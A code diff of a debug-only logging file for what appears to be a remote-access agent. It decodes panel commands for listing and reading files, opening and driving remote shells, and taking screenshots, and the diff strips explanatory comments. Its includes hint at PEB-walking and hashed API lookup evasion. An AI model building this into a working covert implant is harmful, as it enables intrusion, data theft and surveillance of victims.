@@ -1,23 +1,13 @@
-/* report.c - everything printed for the human (see report.h).
- */
-
 #include "report.h"
 #include "types.h"
 #include "peb.h"
 #include "djb2.h"
 #include "logger.h"
 
-/* This whole file is terminal diagnostics. In a release build (built
- * without -DLOGGING_ENABLED) it compiles to nothing and none of its
- * format strings enter the binary. */
 #ifndef LOGGING_ENABLED
-/* silent build: no diagnostics */
+
 #else
 
-
-/* ---------------------------------------------------------------------------
- * ws_buffer_type_name - WinHTTP's WebSocket buffer type, as a string.
- * ------------------------------------------------------------------------- */
 const char *ws_buffer_type_name(WINHTTP_WEB_SOCKET_BUFFER_TYPE type)
 {
     switch (type) {
@@ -30,13 +20,10 @@ const char *ws_buffer_type_name(WINHTTP_WEB_SOCKET_BUFFER_TYPE type)
     }
 }
 
-/* ---------------------------------------------------------------------------
- * command_name - the relay-protocol name of an incoming command opcode.
- * ------------------------------------------------------------------------- */
 const char *command_name(unsigned char opcode)
 {
     switch (opcode) {
-    //case CMD_HELLO:            return "Hello";
+
     case CMD_LIST_DIRECTORY:   return "ListDirectory";
     case CMD_READ_FILE:        return "ReadFile";
     case CMD_HASH_FILE:        return "HashFile";
@@ -51,7 +38,6 @@ const char *command_name(unsigned char opcode)
     }
 }
 
-/* Classic 16-bytes-per-line hex dump with an ASCII column. */
 void hex_dump(const unsigned char *data, DWORD length)
 {
     for (DWORD row = 0; row < length; row += 16) {
@@ -73,8 +59,6 @@ void hex_dump(const unsigned char *data, DWORD length)
     }
 }
 
-/* Decode the command-specific part (everything after the 1-byte opcode) so
- * the terminal says WHAT the panel asked for, not just raw bytes. */
 void describe_command_payload(unsigned char opcode,
                               const unsigned char *p, DWORD len)
 {
@@ -84,19 +68,19 @@ void describe_command_payload(unsigned char opcode,
     }
 
     switch (opcode) {
-    case CMD_LIST_DIRECTORY:            /* UTF-16LE path + NUL */
+    case CMD_LIST_DIRECTORY:
     case CMD_HASH_FILE: {
         LOG_INFO("    payload: path = \"");
         for (DWORD i = 0; i + 1 < len; i += 2) {
             unsigned char lo = p[i], hi = (i + 1 < len) ? p[i+1] : 0;
             unsigned short wc = (unsigned short)(lo | (hi << 8));
-            if (wc == 0) break;         /* NUL terminator */
+            if (wc == 0) break;
             LOG_INFO("%c", (wc >= 0x20 && wc < 0x7f) ? wc : '.');
         }
         LOG_INFO("\"\n");
         break;
     }
-    case CMD_READ_FILE: {               /* u64 size, u64 offset, then path */
+    case CMD_READ_FILE: {
         if (len >= 16) {
             unsigned long long size = 0, offset = 0;
             for (int i = 7; i >= 0; i--)   size   = (size   << 8) | p[i];
@@ -117,7 +101,7 @@ void describe_command_payload(unsigned char opcode,
     case CMD_OPEN_SHELL:
         LOG_INFO("    payload: (empty)\n");
         break;
-    case CMD_WRITE_SHELL: {             /* u64 shellId, then UTF-8 input + NUL */
+    case CMD_WRITE_SHELL: {
         if (len >= 8) {
             unsigned long long id = 0;
             for (int i = 7; i >= 0; i--) id = (id << 8) | p[i];
@@ -133,7 +117,7 @@ void describe_command_payload(unsigned char opcode,
         break;
     }
     case CMD_READ_SHELL:
-    case CMD_CLOSE_SHELL: {             /* u64 shellId */
+    case CMD_CLOSE_SHELL: {
         if (len >= 8) {
             unsigned long long id = 0;
             for (int i = 7; i >= 0; i--) id = (id << 8) | p[i];
@@ -144,7 +128,7 @@ void describe_command_payload(unsigned char opcode,
         }
         break;
     }
-    case CMD_GET_SCREENSHOT: {          /* u32 display, u32 quality, u32 full */
+    case CMD_GET_SCREENSHOT: {
         if (len >= 12) {
             LOG_INFO("    payload: display = %u, quality = %u, fullscreen = %u\n",
                    (unsigned)(p[0] | (p[1] << 8) | (p[2] << 16) |
@@ -164,8 +148,6 @@ void describe_command_payload(unsigned char opcode,
     }
 }
 
-/* Print one received command: header, decoded opcode and payload, hex
- * dump, printable text. Explicit length - the payload is NOT a C string. */
 void print_command(int index, const incoming_message *msg)
 {
     LOG_INFO("[%d] Received: type=%d (%s), len=%lu%s\n",
@@ -194,16 +176,12 @@ void print_command(int index, const incoming_message *msg)
     }
     LOG_INFO("\"\n");
 
-    // if (opcode == CMD_HELLO)
-    //     LOG_INFO("[+] panel asks: who are you? (Hello)\n");
 }
 
-/* Print the outgoing identity frame field by field (the mirror of
- * print_command: everything WE send is shown too, not just what we get). */
 void print_identity_frame(const unsigned char frame[IDENTITY_FRAME_SIZE],
                           int frame_len)
 {
-    /* Numeric fields, little-endian (v5 layout, see protocol.h). */
+
     unsigned status = frame[0]  | (frame[1]  << 8) |
                       (frame[2] << 16) | ((unsigned)frame[3]  << 24);
     unsigned api    = frame[4]  | (frame[5]  << 8) |
@@ -240,7 +218,6 @@ void print_identity_frame(const unsigned char frame[IDENTITY_FRAME_SIZE],
     if ((frame[742] & 7) == 0)
         LOG_INFO("            (information-only agent)\n");
 
-
     DWORD dump_len = (frame_len < HEXDUMP_LIMIT) ? (DWORD)frame_len
                                                  : HEXDUMP_LIMIT;
     hex_dump(frame, dump_len);
@@ -248,4 +225,4 @@ void print_identity_frame(const unsigned char frame[IDENTITY_FRAME_SIZE],
         LOG_INFO("    ... (%d more bytes not dumped)\n", frame_len - (int)dump_len);
 }
 
-#endif /* LOGGING_ENABLED */
+#endif
